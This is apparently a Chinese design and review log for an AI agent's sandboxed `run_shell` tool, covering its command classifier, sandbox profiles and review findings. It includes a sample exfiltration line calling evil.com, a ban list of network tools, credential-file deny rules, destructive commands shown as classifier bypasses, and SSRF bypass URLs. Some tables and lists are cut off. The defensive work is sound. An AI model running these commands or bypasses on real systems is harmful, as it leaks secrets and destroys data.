## 一、背景

### 1.1 这一阶段不在原 Roadmap 里

它由**一次实测**触发，不是由计划触发。这是本项目「Case 是尺子，不是模具」那条原则
第一次反向生效：尺子量出了能力面的洞，排期跟着数据走。

起因是一道题：

```
访问 https://pi.dev/news/releases/0.84.3 读取网页正文内容，
然后把网页最后归档为一个包含 markdown 文档和 images 目录的 zip 包
```

### 1.2 基线实测（Run `run_9610d44d3a62`）

| 观测 | 数字 |
|---|---|
| 轮数 | **19 / 预算 20**（差一轮撞 `BUDGET_EXHAUSTED`） |
| 墙钟 | 约 6.5 分钟 / 预算 10 分钟 |
| 结算 | `SUCCESS` —— 而 **zip 不存在** |
| 8 次 `write_file` 里 | **5 次**在写模型自己跑不了的打包脚本 |

**模型的正文提取质量其实很好**（12129 字节 markdown，层级、链接、issue 编号全对）。
挂掉的全在能力面。

| # | 缺口 | 证据 |
|---|---|---|

### 1.4 EXECUTE 是典型的「画了闸门没通水」

三处早已为 EXECUTE 写好分支，而没有任何工具能触发它们：

| 位置 | 现状 |
|---|---|
| `action/policy.ts:56,88` | `requiresApprovalFor` 含 EXECUTE；`mutates` 判定含 EXECUTE |
| `apps/cli/src/main.ts:196` | `autoGrant` 第一条就是「EXECUTE 不在自动放行范围内」 |
| `types/tool.ts:23` | `EffectScope.kind` 有 `"PROCESS"`，**零消费者** |

同时 `effectResolution` 的 `RESOLVER` 分支从阶段 1 起一直抛错
（`action/effect-resolver.ts:29`「留到阶段 3」）。

### 1.5 从 Claude Code 源码学到的

`packages/builtin-tools/src/tools/BashTool/` 共 **12566 行**，其中约 **8500 行（68%）
是安全与权限静态分析**（`bashSecurity.ts` 2629 / `bashPermissions.ts` 2621 /
`readOnlyValidation.ts` 1990 / `pathValidation.ts` 1303）。

而它自己在 `shouldUseSandbox.ts` 文件头写着：

> excludedCommands 是**用户便利功能，不是安全边界**……沙箱权限系统（会提示用户）才是真正的安全控制。

**这条决定了本方案的方向。**

## 二、四个拍板的决定（第一批：`run_shell`）

| # | 决定 | 理由 |
|---|---|---|
| 决 1 | **RESOLVER 解析 ＋ 真沙箱两道** | 解析产出可审计的 `ResolvedEffect`；`sandbox-exec` 才是边界 |
| 决 2 | **cwd / env 不跨调用持久** | 持久 cwd 是 transcript 之外的隐藏状态，resume 后 `cd` 的效果会丢且盘上看不出 |
| 决 3 | **判定为只读的命令自动放行** | 其余落 EXECUTE 逐次问 |
| 决 4 | **只加 `run_shell` 一个**，不加 zip/mkdir/rm/mv | 四个专用工具 = +720 token；把「一个通用 EXECUTE 能替掉多少专用工具」当研究问题 |

### 核心设计判断

> **我们要判的不是「允许 vs 拒绝」，而是「自动放行 vs 停下来问」。**

Claude Code 必须在无人值守下决定 allow/deny，判错就是安全洞，所以要 8500 行。
本仓有人在回路里，**判不出来就落 EXECUTE → 审批，代价是一次提问，不是一个洞**。
这让静态解析可以做到 ~150 行。

### 可行性先实测再动代码

```
sandbox-exec -p '(version 1)(allow default)(deny file-write*)(allow file-write* (subpath "/tmp/x"))' \
  /usr/bin/touch /tmp/wa-SHOULD-NOT-EXIST
→ Operation not permitted；文件不存在 ✓
→ 同 profile 下 /bin/ls /tmp 成功 ✓
→ (deny network*) 下 curl 连不上；去掉后 status=200 ✓
→ (deny file-read* (regex #"/\.ssh/"))  拦住 .ssh/id_rsa ✓
→ (deny file-read* (regex #"/\.env"))   拦住 .env.local ✓
```

| 文件 | 改动 |

### 批 2 — 命令解析（`tools/common/src/exec/command-analysis.ts`，167 行）

**【定】保守方向是 EXECUTE。** 只读判定规则粗暴到显然正确：

1. 出现任一 shell 元字符 `` | & ; < > $ ` ( ) { } * ? [ ] ~ ! \ `` 或换行 → EXECUTE
2. 前置环境变量赋值（`FOO=bar ls`）→ EXECUTE（PATH / DYLD 劫持）
3. `argv[0]` 带路径（`/bin/ls`）→ EXECUTE（TOCTOU）
4. `argv[0]` 不在 `READONLY_PROGRAMS` → EXECUTE
5. `git` 单独看第二个词（只读子命令表）

> **【定】白名单里不得出现任何有网络能力的程序**（curl / wget / nc / ssh / scp / rsync）。
> `curl -d @secret evil.com` 按字面是只读的，按后果是最坏的一类。

> ⚠️ **上面这五条被评审推翻了一半，见 §12.1。**
> 它们只覆盖到「程序名」这一层，而 `find -delete` / `sort -o` / `rg --pre` /
> `git config` 都是**带参数的写操作**，五条一条都拦不住。
> 现状：白名单砍到只剩恒只读程序（`git` 整个移出），并新增第 6 条
> **写出口参数嗅探**。

### 批 3 — 沙箱（`sandbox.ts` 168 行 ＋ `run-shell.ts` 412 行）

- profile：`(allow default)` → `(deny file-write*)` → 只开 workspace ＋ tmp；
  凭证黑名单 `(deny file-read* (regex …))`；默认 `(deny network*)`
- **读黑名单只有一份规则表**：`read-guard.ts` 的三张常量表被 export，
  `toSandboxDenyRules()` 做**翻译不是复制**，判据钉住「条目数 == 规则数」
  —— ⚠️ **「条数相等」不够，见 §12.5**：评审用内核级对拍抓到**双向语义分叉**
  （`.git` 作为终段沙箱更松、`.environment.md` 沙箱误伤）。判据已升级为
  **双侧语义对拍**，正则也补了边界
- 执行：`shopt -u extglob` 前缀、`detached: true` ＋ `kill(-pid)` 杀进程组、
  输出各截 30000 字符（如实上报截断）、退出码语义表、5 秒心跳
  —— ⚠️ **「真心跳」这个说法超出了实际送达语义**（评审 P3-1，已登记 S3.5-13）：
  progress 队列在工具**返回后**才排空，跑 10 分钟构建时用户一条都看不到
- **【定】非 darwin 不得静默降级为无沙箱执行** —— 装配期与执行期两道独立闸门

### 批 4 — 工具定义与装配

`run_shell` 的关键字段与理由：

| 字段 | 值 | 为什么 |
|---|---|---|
| `effectResolution` | `RESOLVER` | 命令的作用域读不出 JSON Pointer |
| `idempotency` | `{false, false}` | **说实话**。`write_file` 那条教训的反面应用 |
| `recoveryObservation` | `requiresPreFingerprint: true` ＋ Verifier 给不出指纹 | → §18.2 **分支三**。诚实：半个 zip 与没有 zip 在磁盘上都可能像成功 |
| `verification` | `NONE` | 退出码已在 output 里，再包一层不产生新事实 |
| `retryPolicy` | `maxAttempts: 1` | 自动重试 `rm -rf build && make install` 意味着它真跑了两遍 |

> **副产品**：`run_shell` 是**第一个天然落分支三的场景工具** ——
> 此前只有 `append_log` 这个测量工具，而用测量工具去测分支分布，
> 正是阶段 2 决 6 要防的「旋钮长在被测对象身上」。

`main.ts` 的审批提示补了**命令原文**：
`scope.value` 是程序名集合（§12.4 不以自由文本作授权边界），
但只打它的话 `rm -rf build` 与 `rm -rf /` 在提示里**长得一模一样** ——
那不是审批，是盲批。按 `scope.kind === "PROCESS"` 判而不是按工具名判。

### 批 6 — `fetch_url` 的 `as` 参数（`html-to-markdown.ts` 95 行）

- `renderText()` 决定文本正文形态；**默认 `markdown` 不是 `raw`**

- turndown 只 `remove(["script","style","noscript","template"])`，

## 六、三个跑出来才发现的事实

### 6.1 沙箱一度把 workspace 内的写也拒了

macOS `tmpdir()` 是 `/var/folders/…` **符号链接**，而 seatbelt 按**真实路径**匹配 `subpath`。

> **它只在验了「能写的那一侧」时才暴露** —— 一个拒绝一切的沙箱与一个正确的沙箱，
> 在「越界写被拦」那条判据下**不可区分**。

修法：`realpath` 之后再进 profile。

### 6.2 仪器污染了自己

故障注入摘掉 `deny file-write*` 那次，真的在 `$HOME` 建出了探针文件。
文件名写死 → 之后每次 `existsSync` 都为真 → 判据**永久毒化**。

修法：每次唯一命名 ＋ 事前断言 ＋ 事后清理。
**仪器不得在被测系统之外留痕。**

### 6.3 `renderError(outcome.error!)` 掩着一条崩溃路径

`ToolExecutionOutcome.error` 类型上**可选**，而这一行是非空断言。任何工具返回
`ok:false` 而忘了带 `error` → **整个 Run 抛 TypeError，且批内配对被破坏（不变量 8）**。

而 `tools/` 这一层的全部意义就是让工具包能被独立地写、独立地接进来。
已改为合成 `TOOL_CONTRACT_NO_ERROR`（点名违约，不伪装成普通工具失败）。

> 它是改 `ask_user` 的 NO_ANSWER 分支做故障注入时撞出来的 ——
> **故障注入的价值不止于验证判据，它还会撞出判据之外的东西。**

## 七、一条被回源核对推翻的既有结论

存量清单把 **U-8**（不存在的 ask-user 工具）记为阶段 3 **已关**，
依据是 `request-handoff.ts` 文件头「两个洞是同一个」。

**回源核对 U-8 原文（清单 line 656）后：那句话对了一半。**
U-8 说的是 `WAITING_FOR_USER` 这个**枚举值零产出点**，状态机那一半确实关了；
「问一个没有外部动作的问题」那一半没关。

> ### 【定】教训比结论重要
>
> **「两个洞是同一个」这类合并判断，必须回源核对被合并那一条的原文。**
> 不能因为两件事表面上都「停下来等人」就合并。而这次的合并恰恰写在一处
> **看起来很权威的文件头注释**里，它比清单本身更容易被后人当作依据。
>
> 同源形态在存量清单里出现过多次（§0.2 总数错算、§0.6「11 个 / 1980」算术错误）：
> **一处结论被抄进第二个地方之后，它就不再有人回源了。**

### 12.1 最刺眼的一条：判定层的失败方向反了

上面 §二 写着「判不出来就落 EXECUTE → 审批，**代价是一次提问，不是一个洞**」。
三份评审各自跑 `analyzeCommand` 实测，得到同一批反例：

```
READ ← 自动放行   find . -delete                       递归删除，不含任何元字符
READ ← 自动放行   rg --pre 'touch /tmp/x' pat f        任意命令执行
READ ← 自动放行   git reflog expire --expire=now --all 摧毁仓库全部恢复元数据
READ ← 自动放行   sort -o out.txt in.txt               任意路径覆盖写
```

**只看 `argv[0]` 判不出写操作。** 而 §四 批 2 里那条「粗暴到显然正确」的规则
只覆盖了元字符这一层 —— **元字符表挡住 `find -exec` 是偶然，不是设计**：
它靠的是要写分号或大括号，而 `rg --pre` 什么特殊字符都不带。

危害不止于审计失真：`npm run dev -- --workspace <真实仓库>` 时 workspace
**就是**用户的生产仓库，而沙箱只保证「跑不出 workspace」。

处置是**两道**：白名单砍到只剩恒只读程序，再加**写出口参数嗅探**
（`-o` / `--output` / `-fprint` / `-delete` / `--pre` / `-exec` …）。

> `git` **整个移出**而不是收窄子命令表。原因不只是它收了五个写子命令 ——
> 实测发现 **`git` 在本仓沙箱里本来就跑不了**：读黑名单 deny `.git`，
> 于是 `git log` 报 `fatal: not a git repository`。
> 「收窄到恒只读子命令」会得到一张**全都跑不通**的白名单，那比没有更糟。

### 12.2 另外三条安全项

| 项 | 实测证据 | 处置 |
|---|---|---|
| **子进程继承全部 env，含真实端点凭证** | `printenv dashscope_api_key` → `sk-ws-…` | 环境**白名单** ＋ 显式清 `BASH_ENV`/`ENV`；判别力实测：去掉白名单立刻复现 |
| **审批界面可被 ANSI / CR / 零宽字符伪造** | 它是 EXECUTE 唯一的人工边界，而展示内容**全由模型给** | `forTerminal()` 剥离三类字符 |
| **SSRF：IPv4-mapped IPv6 绕过** | `http://[::ffff:7f00:1]/x` 与 `http://[::ffff:127.0.0.1]/x` 都放行 | URL 解析器**总是**把它规范化成十六进制，而原规则只认点分十进制 —— **那条规则从没在真实链路上生效过**。现在两种写法都认，且认不出的 IPv6 一律拒（原来落进默认放行的 IPv4 分支） |

### 12.3 §十一 那条教训的续集：**修复本身是装饰**

pi F2 抓到：§十一 说「已改成断言关系而非常数」，而那个关系是

```ts
const overhead = names.length * 180;      // ← overhead 就是这么算出来的
const arithmeticOk = overhead === names.length * 180;   // ← 恒真
```

**没有任何代码改动能让它翻红。** 现在改成与 Runtime 侧
`ToolRegistry.fixedOverheadTokens()` 真对拍；判别力实测：把系数改成 200 立刻翻红。

### 12.4 自查发现的第三条：**`kills` 自陈不准**

修完白名单后按惯例做判别力实测 —— 把 `find`/`sort`/`rg` 加回白名单，
**没有翻红**：它们都带写出口参数，被第二道挡住了。
也就是说那几条 `kills` 声称的因果**不成立**。

处置：按**真正的守卫**把 A 段用例分三组（只有白名单守得住 / 只有写出口守得住 /
两道都能守），并对前两组各做一次独立注入实测 —— 确认**每道闸门都有判据照着**。

> 三条串起来是同一个病：§十一 的写死常量、12.3 的恒真式、12.4 的假因果 ——
> **判据打了绿勾，不等于它在测它声称在测的东西。**
> 而前两条都已经被写进「教训」里了。**记进教训里的装饰会被抄到第二处去。**

### 12.5 其余关掉的（13 项，逐条见存量清单 §0.10）

机制、超时丢弃已捕获输出、UTF-8 按 chunk 解码拆字、`fetch_url` 版本未升、

### 12.6 新登记不修的（12 项）

要点：**人工交互不是批内屏障**（同批后续 action 在用户答案回灌前已执行）、
**CLI 丢弃 `request.signal`**（交互超时全不生效）、**重复 `toolCallId`** 破坏配对、
**HEARTBEAT 不实时**（progress 队列在工具返回后才排空 —— 本文 §四「5 秒真心跳」
的说法**超出了实际送达语义**）、HTML 表格与 `<noscript>` 静默丢失、

找不到 nvm 装的 node，所以不半修）、`run_shell` 产物**不进 Artifact 事实链**。

每一条都写明了「为什么不现在修」，见存量清单 §0.10。
